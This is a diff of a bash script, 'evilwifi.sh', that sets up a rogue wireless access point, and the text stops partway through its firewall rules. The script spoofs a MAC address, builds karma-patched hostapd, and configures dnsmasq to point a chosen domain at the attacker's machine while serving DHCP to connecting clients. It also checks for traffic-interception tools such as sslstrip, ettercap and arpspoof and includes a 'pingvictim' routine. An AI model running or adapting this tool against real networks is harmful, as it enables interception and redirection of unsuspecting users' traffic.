@@ -6,74 +6,161 @@ TAPIP=10.0.0.1             #ip address of moniface
 NETMASK=255.255.0.0        #subnetmask
 WILDCARD=0.0.255.255       #dunno what this is
 # =>
-NETWORK=10.0.0.0/16
+NETWORK=10.0.0.0/16        #Network Size
 TAPIPBLOCK=10.0.0.0        #subnet
 DHCPS=10.0.0.1             #dhcp start range
 DHCPE=10.0.255.254         #dhcp end range
 BROADCAST=10.0.255.255     #broadcast address
 # Hosts/Net 65534          #CLASS C, Private Internet
 DHCPL=1h                   #time for dhcp lease
-####################
-#  OTHER SETTINGS  #
-####################
-termwidth=130
-folder=/tmp/.evilwifi
-settings=/etc/evilwifi.conf
-lockfile=$folder/evilwifi.lock
-karma_enabled=1
 ########################################
-### IF YOU TOUCH ANYTHING UNDER THIS ### 
+### IF YOU TOUCH ANYTHING UNDER THIS ###
 ### NO SUPPORT WILL BE GIVEN TO YOU  ###
-########################################
 ########################################
 ###      YOU HAVE BEEN WARNED!!!     ###
 ###                                  ###
 ########################################
-REVISION=052
-#############################
-#    UNCOMMENT TO ENABLE    #
-#############################
-function customfirewall(){
-echo "Loading Custom Firewall Rules"
-#iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
-#iptables -t nat -A YOURRULEHERE
-}
 function banner(){
 echo "
-######## ##     ## #### ##          ##      ## #### ######## #### 
-##       ##     ##  ##  ##          ##  ##  ##  ##  ##        ##  
-##       ##     ##  ##  ##          ##  ##  ##  ##  ##        ##  
-######   ##     ##  ##  ##          ##  ##  ##  ##  ######    ##  
-##        ##   ##   ##  ##          ##  ##  ##  ##  ##        ##  
-##         ## ##    ##  ##          ##  ##  ##  ##  ##        ##  
-########    ###    #### ########     ###  ###  #### ##       #### 
+######## ##     ## #### ##          ##      ## #### ######## ####
+##       ##     ##  ##  ##          ##  ##  ##  ##  ##        ## 
+##       ##     ##  ##  ##          ##  ##  ##  ##  ##        ## 
+######   ##     ##  ##  ##          ##  ##  ##  ##  ######    ## 
+##        ##   ##   ##  ##          ##  ##  ##  ##  ##        ## 
+##         ## ##    ##  ##          ##  ##  ##  ##  ##        ## 
+########    ###    #### ########     ###  ###  #### ##       ####
 
 +-++-+ +-++-++-++-++-++-+ +-++-++-++-++-++-++-+ +-++-++-++-++-++-+
 |B||Y| |H||A||C||K||E||R| |B||U||S||T||E||R||S| |C||A||N||A||D||A|
 +-++-+ +-++-++-++-++-++-+ +-++-++-++-++-++-++-+ +-++-++-++-++-++-+
 "
 }
+function banner2(){
+echo "
+          _ _       _ ___ _ 
+  ___ _ _|_| |_ _ _|_|  _|_|
+ | -_| | | | | | | | |  _| |
+ |___|\_/|_|_|_____|_|_| |_|
+"
+}
+function setupenv(){
+datestamp=$(date +%F_%I-%M-%S-%p)
+echo "| [ >> ] SETTING UP!";
+REVISION=052
+mydistro="`awk '{print $1}' /etc/issue`"
+myversion="`awk '{print $2}' /etc/issue`"
+myrelease="`awk '{print $3}' /etc/issue`"
 OK=`printf "\e[1;32m OK \e[0m"`
+WARN=`printf "\e[1;33mWARN\e[0m"`
 FAIL=`printf "\e[1;31mFAIL\e[0m"`
+CRIT=`printf "\e[1;37mCRIT\e[0m"`
 initpath=`pwd`
 hostname=$(hostname)
+resolution=$(xdpyinfo | grep 'dimensions:' | awk -F" " {'print $2'} | awk -F"x" {'print $1'})
+folder=/tmp/.evilwifi
+settings=/etc/evilwifi.conf
+lockfile=$folder/evilwifi.lock
+dhcpconf=/etc/dhcp3/dhcpd.conf
 arpaaddr=$(echo $TAPIP|rev)
-#[ -f = $lockfile ] || { echo "$lockfile Detected - Script Halted!"; exit 1; }
-rm -rf $folder && mkdir $folder;
-sessionfolder=$folder/SESSION_$RANDOM
+# if [ -f $lockfile ]; then echo "$lockfile Detected - Script Halted!"; exit 1; fi
+if [ ! -d $folder ]; then mkdir $folder; fi
+sessionfolder=$folder/$datestamp;
 mkdir $sessionfolder;
 mkdir $sessionfolder/logs;
 mkdir $sessionfolder/pids;
 mkdir $sessionfolder/pcaps;
 mkdir $sessionfolder/config;
-LOG=$sessionfolder/logs/evilwifi.log
-touch $LOG;
+LOG=$sessionfolder/logs/evilwifi.log;
+touch $sessionfolder/logs/evilwifi.log;
 touch $sessionfolder/logs/missing.log;
 touch $sessionfolder/config/hostapd.deny;
 touch $sessionfolder/config/hostapd.accept;
-touch $lockfile
+touch $lockfile;
+if [ "$COLORTERM" = "xfce4-terminal" ]; then
+TERM="xfce4-terminal --hide-menubar ";
+fi
+if [ "$COLORTERM" = "gnome-terminal" ]; then
+TERM="gnome-terminal --hide-menubar ";
+
+
+TERM="xterm +aw +bc +fullscreen -bg black -fg green ";
+
+
+
+
+echo "| [$OK] $datestamp";
+}
+function debugenv(){
+echo "###################################"
+echo "# DEBUG MODE SHOWING ENV SETTINGS #"
+echo "###################################"
+echo "* REVISION: $REVISION *"
+echo "* DISTRO: $mydistro *"
+echo "* VERSION: $myversion *"
+echo "* RELEASE: $myrelease *"
+echo "* RESOLUTION: $resolution *"
+echo "* OK: $OK *"
+echo "* FAIL: $FAIL *"
+echo "* CRIT: $CRIT *"
+echo "* WARN: $WARN *"
+echo "* INITPATH: $initpath *"
+echo "* FOLDER: $folder *"
+echo "* SESSION: $sessionfolder *"
+echo "* LOCKFILE: $lockfile *"
+echo "* SETTINGS: $settings *"
+echo "* FIREWALL STATE:  *"
+echo "###################################"
+echo "# END OF DEBUG MODE AWWWWWWWWWWWW #"
+echo "###################################"
+}
+function debugsettings(){
+echo "###################################"
+echo "# DEBUG MODE SHOWING AP SETTINGS  #"
+echo "###################################"
+echo "* ATHIFACE: $ATHIFACE *"
+echo "* ATHIFACEMAC: $ATHIFACEMAC *"
+echo "* ATHIP: $ATHIP *"
+echo "* TAPIFACE: $TAPIFACE *"
+echo "* TAPIFACEMAC: $TAPIFACEMAC *"
+echo "* TAPIP: $TAPIP *"
+echo "* WANIFACE: $WANIFACE *"
+echo "* WANIFACEMAC: $WANIFACEMAC *"
+echo "* WANIP: $WANIP *"
+echo "* LANIFACE: $LANIFACE *"
+echo "* LANIFACEMAC: $LANIFACEMAC *"
+echo "* LANIP: $LANIP *"
+echo "* MONIFACE: $MONIFACE *"
+echo "* MONIFACEMAC: $MONIFACEMAC *"
+echo "* MONIP: <n/a> *"
+echo "* BRLANIFACE: $BRLANIFACE *"
+echo "* BRLANIFACEMAC: $BRLANIFACEMAC *"
+echo "* BRLANIP: $BRLANIP *"
+echo "* *"
+echo "* ACCESS POINT: $ESSID *"
+echo "* CHANNEL: $CHAN *"
+echo "* PACKETS PER SECOND: $PPS *"
+echo "* BEACON INTERVAL: $BEAINT *"
+echo "###################################"
+echo "# END OF DEBUG MODE AWWWWWWWWWWWW #"
+echo "###################################"
+}
+function injectiontest(){
+echo "[>] Injection Test";
+aireplay-ng -9 $MONIFACE > $sessionfolder/logs/injectiontest.log
+sleep 3
+if grep -q 'Injection is working!' $sessionfolder/logs/injectiontest.log; then
+echo "[$OK] Packet Injection Works!";
+else
+zenity --error --text "Injection is not working. Reconnect your wireless card and try again."
+echo
+exit
+fi
+echo "[$OK] DONE -> $datestamp";
+}
 function killscript(){
+echo "Detected CTRL+C..."
 stopshit
+brlandown
 monitormodestop
 cleanup
 exit 0;
@@ -83,24 +170,32 @@ trap killscript INT HUP EXIT;
 # INTERNET TESTING #
 ####################
 function icmptest(){
-echo
+echo "| [ >> ] ICMP TEST";
+
+echo "| [$OK] $datestamp";
 }
 function pinginternet(){
+echo "| [ >> ] WAN ICMP TEST";
 INTERNETTEST=$(awk '/bytes from/ { print $1 }' < <(ping 8.8.8.8 -c 1 -w 3))
 if [ "$INTERNETTEST" = "64" ]; then INTERNET=TRUE; else INTERNET=FALSE; fi
 WANIP=$(curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+')
 if [ "$WANIP" != "" ]; then INTERNET=TRUE; else INTERNET=FALSE; fi
+echo "| [$OK] $datestamp";
 }
 function dnscheck(){
+echo "| [ >> ] DNS TEST";
 DNSCHECK=$(awk '/bytes from/ { print $1 }' < <(ping raw.github.com -c 1 -w 3))
 if [ "$DNSCHECK" = "64" ]; then DNS=TRUE; else DNS=FALSE; fi
+echo "| [$OK] $datestamp";
 }
 function pinggateway(){
+echo "[ >> ] GATEWAY ICMP TEST";
 GATEWAYRDNS=$(awk '/br-lan/ && /UG/ {print $2}' < <(route))
 GATEWAY=$(awk '/br-lan/ && /UG/ { print $2 }' < <(route -n))
 echo "Pinging $GATEWAYRDNS [$GATEWAY] with 64 bytes of data:"
 GATEWAYTEST=$(awk '/bytes from/ { print $1 }' < <(ping $GATEWAY -c 1 -w 3))
 if [ "$GATEWAYTEST" = "64" ]; then echo "Reply from $GATEWAY: bytes=64"; else echo "Request timed out."; fi
+echo "[$OK] DONE -> $datestamp";
 }
 function pingvictim(){
 echo "Pinging $VICTIMRDNS [$VICTIM] with 64 bytes of data:"
@@ -139,6 +234,31 @@ fi
 ######################
 # DEPENDENCY SECTION #
 ######################
+function depends(){
+echo "| [ >> ] Dependency Check Started"
+if [ $UID -eq 0 ]; then echo "We are root: `date`" >> $LOG
+else
+echo "[$CRIT] Please Run This Script As Root or With Sudo!";
+echo "";
+exit 0; fi
+echo "| [$OK] SCRIPT REVISION: $REVISION"
+if [ "$mydistro" = "BackTrack" ]; then echo "| [$OK] $mydistro Version $myversion Release $myrelease"; fi
+if [ "$mydistro" = "Kali" ]; then echo "| [$OK] $mydistro Release $myrelease"; fi
+if [ "$mydistro" = "Ubuntu" ]; then echo "| [$OK] $mydistro Version $myversion"; fi
+if [ "$INTERNET" = "FALSE" ]; then echo "| [$FAIL] No Internet Connection :-("; fi
+if [ "$INTERNET" = "TRUE" ]; then echo "| [$OK] We Have Internet :-)"; dnscheck; fi
+if [ "$ICMPBLOCK" = "TRUE" ]; then echo "| [$WARN] Outbound ICMP Ping Is Blocked WAN SIDE ($WANIP)"; fi
+if [ "$DNS" = "FALSE" ]; then echo "| [$FAIL] DNS Error Cant Update Check"; fi
+critarray=( aircrack-ng iptables dnsmasq dhcpd3 dhcpd xterm python macchanger wget perl brctl )
+for depend in ${critarray[@]}; do
+type -P $depend &>/dev/null || { echo "| [$CRIT] $depend"; echo "$depend" >> $sessionfolder/logs/missing.log; };
+done
+warnarray=( airdrop-ng arpspoof dpkg driftnet dsniff ettercap hostapd mdk3 msfconsole sslstrip urlsnarf svn )
+for depend in ${warnarray[@]}; do
+type -P $depend &>/dev/null || { echo "| [$WARN] $depend"; echo "$depend" >> $sessionfolder/logs/missing.log; };
+done
+echo "| [$OK] $datestamp";
+}
 function uninstalldeps(){
 echo "[>] REMOVING AIRCRACK-NG!";
 cd /usr/src/aircrack-ng;
@@ -146,100 +266,111 @@ make uninstall &>/dev/null;
 cd /usr/src;
 rm -rf aircrack-ng;
 echo "[>] REMOVING HOSTAPD!";
-
+cd /usr/src/hostapd-1.0-karma/hostapd;
+make clean &>/dev/null;
+rm -rf /usr/local/bin/hostapd;
+rm -rf /usr/local/bin/hostapd_cli;
+echo "[$OK] DONE -> $datestamp";
 }
 function installdeps(){
 echo "[>] INSTALLING DEPENDS! (internet required)";
-dpkg --force-all -P aircrack-ng;
-apt-get update && apt-get upgrade;
-apt-get install lighttpd libssl-dev -y;
+echo "[$WARN] PLEASE ENABLE UNIVERSE IN /etc/apt/sources.list!!!!";
+apt-get update;
+apt-get install libssl-dev -y;
+apt-get install bridge-utils -y;
+apt-get install libnl-dev -y;
+# apt-get install python-dev -y;
 [ -d "/usr/src/aircrack-ng" ] || installaircrack;
 [ -d "/usr/src/hostapd-1.0-karma" ] || installhostapd;
 installlighttpd;
+echo "[$OK] DONE -> $datestamp";
 }
 function installaircrack(){
+dpkg --force-depends --purge aircrack-ng;
 echo "[>] INSTALLING AIRCRACK-NG! (internet required)";
-cd /usr/src
+cd /usr/src;
 rm -rf aircrack-ng*;
-svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng
+echo "[>] CHECKING OUT AIRCRACK-NG!";
+svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng &>/dev/null;
+echo "[$OK] DONE -> $datestamp";
 cd aircrack-ng;
 make uninstall &>/dev/null;
 make clean &>/dev/null;
+echo "[>] STARTING MAKE! (watch for errors)";
+sleep 5;
 make &>$sessionfolder/logs/aircrack_make.log;
 make install &>$sessionfolder/logs/aircrack_make_install.log;
+echo "[$OK] DONE -> $datestamp";
 echo "[*] LOGS CAN BE FOUND IN $sessionfolder/logs/";
-sleep 4
-airodump-ng-oui-update
-cd $initpath
+sleep 3;
+airodump-ng-oui-update;
+cd $initpath;
 }
 function installhostapd(){
 echo "[>] INSTALLING HOSTAPD! (internet required)";
-cd /usr/src
+cd /usr/src;
 wget -a $sessionfolder/logs/wget.log -t 3 -T 10 http://www.digininja.org/files/hostapd-1.0-karma.tar.bz2;
 tar -xf hostapd-1.0-karma.tar.bz2;
 cd hostapd-1.0-karma/hostapd/;
-echo "[>] RUNNING MAKE && MAKE INSTALL";
+echo "[>] STARTING MAKE! (watch for errors)";
+sleep 5;
 make &>$sessionfolder/logs/hostapd_make.log;
 make install &>$sessionfolder/logs/hostapd_make_install.log;
+echo "[$OK] DONE -> $datestamp";
 echo "[*] LOGS CAN BE FOUND IN $sessionfolder/logs/";
-cd $initpath
+sleep 3;
+cd $initpath;
 }
 ####################
 # PIDS AND CLEANUP #
 ####################
 function pspids(){
-pgrep airbase-ng > $sessionfolder/pids/airbase-ng.pid
-pgrep dnsmasq > $sessionfolder/pids/dnsmasq.pid
-pgrep hostapd > $sessionfolder/pids/hostapd.pid
-pgrep dumpcap > $sessionfolder/pids/dumpcap.pid
-pgrep wireshark > $sessionfolder/pids/wireshark.pid
-pgrep lighttpd > $sessionfolder/pids/lighttpd.pid
+pidarray=( airbase-ng dnsmasq hostapd dumpcap wireshark lighttpd )
+for program in ${pidarray[@]}; do
+pgrep $program > $sessionfolder/pids/$program.pid;
+done
 }
 function stopshit(){
-pspids
-service lighttpd stop &>>$LOG
-service apache2 stop &>>$LOG
-service dhcp3-server stop &>>$LOG
+pspids;
+service lighttpd stop &>>$LOG;
+service apache2 stop &>>$LOG;
+service dhcp3-server stop &>>$LOG;
 while [ -s $sessionfolder/pids/airbase-ng.pid ]; do
-sleep 2
-pspids
-echo "Killing Airbase-NG"
-kill `awk '{ print $1 }' < <(cat $sessionfolder/pids/airbase-ng.pid)` &>/dev/null
+sleep 2;
+pspids;
+echo "Killing Airbase-NG";
+kill `awk '{ print $1 }' < <(cat $sessionfolder/pids/airbase-ng.pid)` &>/dev/null;
 done
 while [ -s $sessionfolder/pids/hostapd.pid ]; do
-airmon-ng stop mon.$TAPIFACE &>/dev/null
-sleep 2
-pspids
-echo "Killing Hostapd"
-kill -9 `awk '{ print $1 }' < <(cat $sessionfolder/pids/hostapd.pid)` &>/dev/null
+airmon-ng stop mon.$TAPIFACE &>/dev/null;
+sleep 2;
+pspids;
+echo "Killing Hostapd";
+kill -9 `awk '{ print $1 }' < <(cat $sessionfolder/pids/hostapd.pid)` &>/dev/null;
 done
 while [ -s $sessionfolder/pids/dnsmasq.pid ]; do
-sleep 2
-pspids
-echo "Killing DNSMASQ"
-kill `awk '{ print $1 }' < <(cat $sessionfolder/pids/dnsmasq.pid)` &>/dev/null
+sleep 2;
+pspids;
+echo "Killing DNSMASQ";
+kill `awk '{ print $1 }' < <(cat $sessionfolder/pids/dnsmasq.pid)` &>/dev/null;
 done
 while [ -s $sessionfolder/pids/dumpcap.pid ]; do
-sleep 2
-pspids
-echo "Killing DUMPCAP"
-kill `awk '{ print $1 }' < <(cat $sessionfolder/pids/dumpcap.pid)` &>/dev/null
+sleep 2;
+pspids;
+echo "Killing DUMPCAP";
+kill `awk '{ print $1 }' < <(cat $sessionfolder/pids/dumpcap.pid)` &>/dev/null;
 done
 for pid in `ls $sessionfolder/pids/*.pid 2>$LOG`; do if [ -s "$pid" ]; then
-kill `cat $sessionfolder/pids/probe.pid 2>$LOG` &>/dev/null
-kill `cat $sessionfolder/pids/pwned.pid 2>$LOG` &>/dev/null
-kill `cat $sessionfolder/pids/web.pid 2>$LOG` &>/dev/null
-kill `cat $pid 2>$LOG` &>/dev/null
+kill `cat $pid 2>$LOG` &>/dev/null;
 fi; done
 if [ -f /var/run/dhcpd/$TAPIFACE.pid ]; then
 kill `cat /var/run/dhcpd/$TAPIFACE.pid 2>$LOG` &>/dev/null;
 fi
 killall -9 airodump-ng aireplay-ng mdk3 driftnet urlsnarf dsniff &>/dev/null
-firewallreset
-if [ "$ATHIFACE" != "" ]; then ifconfig $ATHIFACE down; fi
+fw_stop
+echo "nameserver 8.8.8.8" > /etc/resolv.conf
 }
 function cleanup(){
-dhcpconf=/etc/dhcp3/dhcpd.conf
 echo > $dhcpconf
 rm -rf $lockfile
 # mv $APACHECONF/default~ $APACHECONF/default
@@ -248,6 +379,7 @@ rm -rf $lockfile
 # CONF FILE MAKER #
 ###################
 function settings(){
+if [ -f $settings ]; then echo "| [$OK] Config File Found!"; fi
 echo ""
 echo "+===================================+"
 echo "| Listing Wireless Devices          |"
@@ -257,14 +389,18 @@ echo "+===================================+"
 echo ""
 echo "Pressing Enter Uses Default Settings"
 echo ""
+read -e -p "Internet or WAN Interface [eth0]: " WANIFACE
+if [ "$WANIFACE" = "" ]; then WANIFACE=eth0; fi
+read -e -p "Create Bridge Interface [br-lan]: " BRLANIFACE
+if [ "$BRLANIFACE" = "" ]; then BRLANIFACE=br-lan; fi
 read -e -p "RF Moniter Interface [wlan0]: " ATHIFACE
 if [ "$ATHIFACE" = "" ]; then ATHIFACE=wlan0; fi
 ifconfig $ATHIFACE down
 sleep 2
 iwconfig $ATHIFACE mode managed
 ifconfig $ATHIFACE up
-MAC=$(awk '/HWaddr/ { print $5 }' < <(ifconfig $ATHIFACE))
-read -e -p "Spoof MAC Addres For $ATHIFACE [$MAC]: " SPOOFMAC
+ATHIFACEMAC=$(awk '/HWaddr/ { print $5 }' < <(ifconfig $ATHIFACE))
+read -e -p "Spoof MAC Addres For $ATHIFACE [$ATHIFACEMAC]: " SPOOFMAC
 read -e -p "What SSID Do You Want To Use [WiFi]: " ESSID
 if [ "$ESSID" = "" ]; then ESSID=WiFi; fi
 read -e -p "What CHANNEL Do You Want To Use [1]: " CHAN
@@ -285,6 +421,8 @@ if [ "$DNSURL" = "" ]; then DNSURL=\#; fi
 echo ""
 echo "[>] CREATING .CONF FILE WITH SETTINGS...";
 echo "ATHIFACE=$ATHIFACE" > $settings
+echo "WANIFACE=$WANIFACE" >> $settings
+echo "BRLANIFACE=$BRLANIFACE" >> $settings
 echo "SPOOFMAC=$SPOOFMAC" >> $settings
 echo "ESSID=$ESSID" >> $settings
 echo "CHAN=$CHAN" >> $settings
@@ -367,31 +505,38 @@ dhcpdserver
 }
 function dnsmasqconfig(){
 dnsmasqconf=$sessionfolder/config/dnsmasq.conf
-echo "# auto-generated config file from evilwifi.sh" > $dnsmasqconf
-echo "address=/$DNSURL/$TAPIP" >> $dnsmasqconf
-#echo "ptr-record=$arpaaddr.in-addr.arpa,$hostname.wirelesslan" >> $dnsmasqconf
-echo "dhcp-authoritative" >> $dnsmasqconf
-echo "dhcp-lease-max=102" >> $dnsmasqconf
+echo "dhcp-authoritative" > $dnsmasqconf
 echo "domain-needed" >> $dnsmasqconf
-echo "domain=wirelesslan" >> $dnsmasqconf
-echo "server=/wirelesslan/" >> $dnsmasqconf
 echo "localise-queries" >> $dnsmasqconf
-echo "log-queries" >> $dnsmasqconf
-echo "log-dhcp" >> $dnsmasqconf
 #echo "read-ethers" >> $dnsmasqconf
 #echo "bogus-priv" >> $dnsmasqconf
-#echo "expand-hosts" >> $dnsmasqconf
-echo "" >> $dnsmasqconf
-echo "interface=$TAPIFACE" >> $dnsmasqconf
+#echo "enable-tftp" >> $dnsmasqconf
+echo "domain=wirelesslan" >> $dnsmasqconf
+echo "server=/wirelesslan/" >> $dnsmasqconf
 echo "dhcp-leasefile=$sessionfolder/dnsmasq.leases" >> $dnsmasqconf
 echo "resolv-file=$sessionfolder/resolv.conf.auto" >> $dnsmasqconf
+#echo "tftp-root=/usb/tftpboot" >> $dnsmasqconf
+#echo "dhcp-boot=pxelinux.0" >> $dnsmasqconf
 echo "stop-dns-rebind" >> $dnsmasqconf
-#echo "rebind-localhost-ok" >> $dnsmasqconf
+echo "" >> $dnsmasqconf
+echo "dhcp-host=$ATHIFACEMAC,$TAPIP" >> $dnsmasqconf
+echo "" >> $dnsmasqconf
+echo "address=/$DNSURL/$TAPIP" >> $dnsmasqconf
+echo "ptr-record=$arpaaddr.in-addr.arpa,$hostname" >> $dnsmasqconf
+echo "" >> $dnsmasqconf
 echo "dhcp-range=wirelesslan,$DHCPS,$DHCPE,$NETMASK,$DHCPL" >> $dnsmasqconf
+echo "no-dhcp-interface=$WANIFACE" >> $dnsmasqconf
+echo "" >> $dnsmasqconf
+echo "# Anything Under This Is Custom Added!" >> $dnsmasqconf
+echo "" >> $dnsmasqconf
+echo "log-queries" >> $dnsmasqconf
+echo "log-dhcp" >> $dnsmasqconf
+#echo "expand-hosts" >> $dnsmasqconf
+echo "interface=$BRLANIFACE" >> $dnsmasqconf
+echo "dhcp-lease-max=102" >> $dnsmasqconf
 echo "dhcp-option=wirelesslan,3,$TAPIP" >> $dnsmasqconf
 echo "dhcp-option=252,\"\n\"" >> $dnsmasqconf
 #echo "dhcp-option=wirelesslan,3," >> $dnsmasqconf
-echo "dhcp-host=$MAC,$TAPIP" >> $dnsmasqconf
 echo "nameserver $TAPIP" > $sessionfolder/resolv.conf.auto
 if [ "$mode" = "1" ]; then startdnsmasq; fi
 if [ "$mode" = "2" ]; then startdnsmasqresolv; fi
@@ -424,183 +569,256 @@ echo "# server.groupname = \"root\"" >> /etc/lighttpd.conf
 ####################
 # FIREWALL RELATED #
 ####################
-function listeningports(){
-netstat -npltw | awk '/0.0.0.0/ {print $4}' | cut -f2 -d ':' > $sessionfolder/logs/listentcp.txt
-netstat -npluw | awk '/0.0.0.0/ {print $4}' | cut -f2 -d ':' > $sessionfolder/logs/listenudp.txt
-}
-function firewallreset(){
-iptables --flush
-iptables --table nat --flush
-iptables --table mangle --flush
-iptables -X
-iptables --delete-chain
-iptables --table nat --delete-chain
-iptables --table mangle --delete-chain
-echo "0" > /proc/sys/net/ipv4/ip_forward
-}
-function firewall(){
-iptables -N logaccept
-iptables -N logdrop
-iptables -N logbrute
-iptables -N logreject
-iptables -N forward
-iptables -N forwarding_lan
-iptables -N forwarding_rule
-iptables -N forwarding_wan
-iptables -N input
-iptables -N input_lan
-iptables -N input_rule
-iptables -N input_wan
-iptables -N nat_reflection_fwd
-iptables -N output
-iptables -N output_rule
-iptables -N syn_flood
-iptables -N reject
-iptables -N zone_lan
-iptables -N zone_lan_ACCEPT
-iptables -N zone_lan_DROP
-iptables -N zone_lan_REJECT
-iptables -N zone_lan_forward
-iptables -N zone_wan
-iptables -N zone_wan_ACCEPT
-iptables -N zone_wan_DROP
-iptables -N zone_wan_REJECT
-iptables -N zone_wan_forward
-iptables -t mangle -N zone_wan_MSSFIX
+function fw_start(){
+fw_init
+# fw_is_loaded && {
+# echo "Firewall already loaded" >&2
+# exit 1
+echo "Loading defaults"
+fw_default
+echo "Loading synflood protection"
+fw_synflood
+echo "Loading zones"
+fw_zones
+echo "Loading forwardings"
+fw_wan
+echo "Loading rules"
+fw_rules
+if [ "$WANIP" != "" ]; then
+echo "Loading redirects"
+fw_natreflection
+fi
+echo "Loading includes"
+# fw_includes
+# fw_custom
+fw_logs
+echo "Loading interfaces"
+fw_interfaces
 echo "1" > /proc/sys/net/ipv4/ip_forward
 }
-function firewallprenat(){
-echo "####################"
-echo "# PRE NAT FIREWALL #"
-echo "####################"
-iptables -P INPUT ACCEPT
-iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-iptables -A INPUT -m conntrack --ctstate INVALID -j DROP
-iptables -A INPUT -i lo -j ACCEPT
-iptables -A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j syn_flood
-iptables -A INPUT -j input_rule
-iptables -A INPUT -j input
-# iptables -A INPUT -i $WANIFACE -p tcp --dport 22 -j logbrute
-iptables -A INPUT -p tcp -d $TAPIP --dport 22 -j logaccept
-# iptables -A INPUT -i $WANIFACE -p icmp -j ACCEPT
-# iptables -A INPUT -i lo -m state --state NEW -j ACCEPT
-iptables -A INPUT -i $TAPIFACE -m state --state NEW -j logaccept
-iptables -A INPUT -i eth0 -m state --state NEW -j logaccept
-iptables -A INPUT -j logdrop
-iptables -P FORWARD ACCEPT
-iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT 
-iptables -A FORWARD -m conntrack --ctstate INVALID -j DROP 
-iptables -A FORWARD -j forwarding_rule 
-iptables -A FORWARD -j forward 
-# iptables -A FORWARD -o $WANIFACE -s $NETWORK -j logaccept
-iptables -A FORWARD -i $TAPIFACE -j logaccept
-iptables -A FORWARD -i $TAPIFACE -o $TAPIFACE -j logaccept
-# iptables -A FORWARD -j victim2wan
-# iptables -A FORWARD -i $TAPIFACE -o $WANIFACE -j logaccept
-iptables -A FORWARD -o $TAPIFACE -d $TAPIP -j logaccept
-iptables -A FORWARD -i $TAPIFACE -m state --state NEW -j logaccept
-iptables -A FORWARD -j logdrop
-iptables -A OUTPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-iptables -A OUTPUT -m conntrack --ctstate INVALID -j DROP
-iptables -A OUTPUT -o lo -j ACCEPT
-iptables -A OUTPUT -o $TAPIFACE -j logaccept
-iptables -A OUTPUT -j output_rule
-iptables -A OUTPUT -j output
-iptables -A logaccept -m limit --limit 2/m -j LOG --log-prefix "LOGACCEPT: "
-iptables -A logaccept -j ACCEPT
-iptables -A logbrute -m limit --limit 5/m -j LOG --log-prefix "LOGBRUTE: "
-iptables -A logbrute -j DROP
-iptables -A logdrop -m limit --limit 5/m -j LOG --log-prefix "LOGDROP: "
-iptables -A logdrop -j DROP
-iptables -A output -j zone_lan_ACCEPT 
-iptables -A output -j zone_wan_ACCEPT 
-iptables -A reject -p tcp -j REJECT --reject-with tcp-reset 
-iptables -A reject -j REJECT --reject-with icmp-port-unreachable 
-iptables -A syn_flood -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -m limit --limit 25/sec --limit-burst 50 -j RETURN 
-iptables -A syn_flood -j DROP
-iptables -A zone_lan -j input_lan 
-iptables -A zone_lan -j zone_lan_ACCEPT
-iptables -A zone_lan_forward -j forwarding_lan 
-iptables -A zone_lan_forward -j zone_lan_ACCEPT 
-# iptables -A logreject -p tcp --reject-with tcp-reset -j REJECT
-echo "# PRE NAT COMPLETE #"
-echo "####################"
+function fw_stop(){
+fw_init
+echo "Flushing firewall"
+iptables --table filter --policy INPUT ACCEPT
+iptables --table filter --policy OUTPUT ACCEPT
+iptables --table filter --policy FORWARD ACCEPT
+iptables --table filter --flush
+iptables --table filter --delete-chain
+iptables --table mangle --flush
+iptables --table mangle --delete-chain
+iptables --table nat --flush
+iptables --table nat --delete-chain
+iptables --table raw --flush
+iptables --table raw --delete-chain
+# fw_stop_extra
+echo "0" > /proc/sys/net/ipv4/ip_forward
+FW_INITIALIZED=0
+}
+function fw_restart(){
+fw_stop
+fw_start
+}
+function fw_reload(){
+fw_restart
+}
+function fw_is_loaded(){
+echo ""
+}
+function fw_init(){
+# [ -z "$FW_INITIALIZED" ] || return 0
+# scan_interfaces
+FW_INITIALIZED=1
+# return 0
+}
+function fw_default(){
+iptables --table filter --new-chain syn_flood
+iptables --table filter --new-chain input
+iptables --table filter --new-chain input_lan
+iptables --table filter --new-chain input_rule
+iptables --table filter --new-chain input_wan
+iptables --table filter --new-chain output
+iptables --table filter --new-chain output_rule
+iptables --table filter --new-chain forward
+iptables --table filter --new-chain forwarding_lan
+iptables --table filter --new-chain forwarding_rule
+iptables --table filter --new-chain forwarding_wan
+iptables --table filter --new-chain logaccept
+iptables --table filter --new-chain logdrop
+iptables --table filter --new-chain logbrute
+iptables --table filter --new-chain logreject
+iptables --table filter --new-chain nat_reflection_fwd
+iptables --table filter --new-chain reject
+iptables --table filter --new-chain zone_lan_ACCEPT
+iptables --table filter --new-chain zone_lan_DROP
+iptables --table filter --new-chain zone_lan_REJECT
+iptables --table filter --new-chain zone_lan
+iptables --table filter --new-chain zone_lan_forward
+iptables --table filter --new-chain zone_wan_ACCEPT
+iptables --table filter --new-chain zone_wan_DROP
+iptables --table filter --new-chain zone_wan_REJECT
+iptables --table filter --new-chain zone_wan
+iptables --table filter --new-chain zone_wan_forward
+iptables --table nat --new-chain prerouting_lan
+iptables --table nat --new-chain prerouting_rule
+iptables --table nat --new-chain prerouting_wan
+iptables --table nat --new-chain postrouting_rule
+iptables --table nat --new-chain nat_reflection_in
+iptables --table nat --new-chain nat_reflection_out
+iptables --table nat --new-chain zone_lan_nat
+iptables --table nat --new-chain zone_lan_prerouting
+iptables --table nat --new-chain zone_wan_nat
+iptables --table nat --new-chain zone_wan_prerouting
+iptables --table raw --new-chain zone_lan_notrack
+iptables --table raw --new-chain zone_wan_notrack
+iptables --table mangle --new-chain zone_wan_MSSFIX
+iptables --table mangle --new-chain internet
+}
+function fw_synflood(){
+iptables --table filter --append syn_flood -j RETURN -p tcp --syn -m limit --limit 25/second --limit-burst 50
+iptables --table filter --append syn_flood -j DROP
+}
+function fw_zones(){
+echo "  Loading Input..."
+iptables --table filter --append INPUT -j ACCEPT -m conntrack --ctstate RELATED,ESTABLISHED
+iptables --table filter --append INPUT -j DROP -m conntrack --ctstate INVALID
+iptables --table filter --append INPUT -j ACCEPT -i lo
+iptables --table filter --append INPUT -j syn_flood -p tcp --syn
